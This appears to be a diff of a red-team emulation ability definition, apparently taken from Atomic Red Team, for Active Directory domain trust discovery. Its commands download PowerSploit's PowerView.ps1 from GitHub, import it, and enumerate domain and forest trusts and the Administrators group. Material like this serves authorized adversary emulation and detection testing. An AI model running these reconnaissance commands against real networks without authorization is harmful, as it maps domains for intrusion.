@@ -14,12 +14,13 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"; fi; if
-          ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And (Get-Command "Get-ADGroupMember"
-          -ErrorAction Ignore)) { exit 0 } else { exit 1 }; then : ; else Write-Host
-          "Sorry RSAT must be installed manually"; fi; Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1";
-          Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember
-          Administrators -Recursive; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()'
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1" -UseBasicParsing;
+          fi; if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And (Get-Command
+          "Get-ADGroupMember" -ErrorAction Ignore)) { exit 0 } else { exit 1 }; then
+          : ; else Write-Host "Sorry RSAT must be installed manually"; fi; Import-Module
+          "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"; Get-NetDomainTrust;
+          Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember Administrators -Recursive;
+          ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()'
   plugin: atomic
   singleton: false
   repeatable: true
@@ -43,7 +44,7 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"
-        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1" -UseBasicParsing
 
         '
     - description: 'RSAT PowerShell AD admin cmdlets must be installed
@@ -58,4 +59,4 @@
         '
     technique_created: '2019-02-14T16:15:05.974Z'
     atomic_guid: c58fbc62-8a62-489e-8f2d-3565d7d96f30
-    import_timestamp: '2026-10-20T07:08:30.713607Z'
+    import_timestamp: '2026-10-21T07:01:52.557732Z'
